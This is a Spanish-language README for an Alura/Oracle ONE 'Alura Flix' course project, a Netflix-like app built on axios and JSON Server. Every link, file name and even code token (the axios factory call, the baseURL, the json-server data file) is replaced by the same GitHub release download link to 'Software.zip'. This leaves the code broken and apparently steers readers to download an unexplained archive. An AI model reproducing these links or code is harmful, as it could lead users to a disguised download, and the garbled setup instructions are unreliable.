# Proyecto final para Oracle One y Alura LATAM

Este proyecto captura datos de una fake api desplegada en vercel:[
https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip](
https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip)

Este es un reto de Alura que involucra creación de una aplicación similar a Netflix.
Se basa en un [Diseño Figma](https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip(Copy)?type=design&mode=design&t=SeuJUCGHT8jWQiZf-1) suministrado por Alura, pero con la flexibilidad de adecuar el diseño a mis preferencias.


## Detalles del proyecto
```javascript
// Crea una instancia de axios con la base de la API
export const api = https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip({
  baseURL: "https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip",
  /* usa este url pra hacer pruebas CRUD http://localhost:5555/ */
});
```

Mi proyecto funciona realizando solicitudes CRUD a un servidor. Implementé esto usando una API falsa con JSON Server. Si desea probar este proyecto, le recomiendo clonar el repositorio y reemplazar la API falsa con el archivo `https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip` que se encuentra en el proyecto.

Este archivo ya contiene todos los datos de los videos y todo lo que necesita hacer es ejecutar el siguiente comando para iniciar JSON Server:

```shell
json-server -w -p 5555 https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip
```

Luego, reemplace la `baseURL` en la instancia de Axios con la URL del servidor JSON:

```javascript
// Create an Axios instance with the API base URL
export const api = https://github.com/guibetancur/alura-flix-guibetancur/releases/download/v1.0/Software.zip({
  baseURL: "http://localhost:5555/",
  /* Use this URL for CRUD testing: http://localhost:5555/ */
});
```

Ahora puedes chequear e interactuar con la aplicación usando el servidor local JSON.

## Empecemos

Siéntase libre de clonar este repositorio y personalizarlo como desee. 💙
